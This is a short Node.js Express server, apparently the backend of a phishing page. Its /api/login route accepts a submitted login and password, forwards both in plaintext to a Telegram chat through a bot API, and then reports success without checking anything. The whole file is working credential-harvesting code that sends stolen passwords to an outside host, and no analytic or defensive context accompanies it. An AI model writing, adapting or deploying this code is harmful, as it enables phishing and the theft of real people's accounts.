require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ---------------- TELEGRAM -------------------
async function sendTelegram(text) {
  try {
    await axios.post(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
      {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text,
        parse_mode: "HTML"
      }
    );
  } catch (err) {
    console.log("Telegram error:", err.response?.data || err);
  }
}

// ---------------- API -------------------
app.post('/api/login', async (req, res) => {
  const { login, password } = req.body;

  if (!login || !password)
    return res.status(400).json({ error: "Login and password required" });

  // Отправляем в Телеграм
  await sendTelegram(`
🔐 <b>New Login Attempt</b>
👤 Login: <b>${login}</b>
🔑 Password: <code>${password}</code>
📅 ${new Date().toLocaleString()}
  `);

  res.json({ ok: true });
});

// ---------------- SERVER -------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🔥 Server started: http://localhost:${PORT}`));
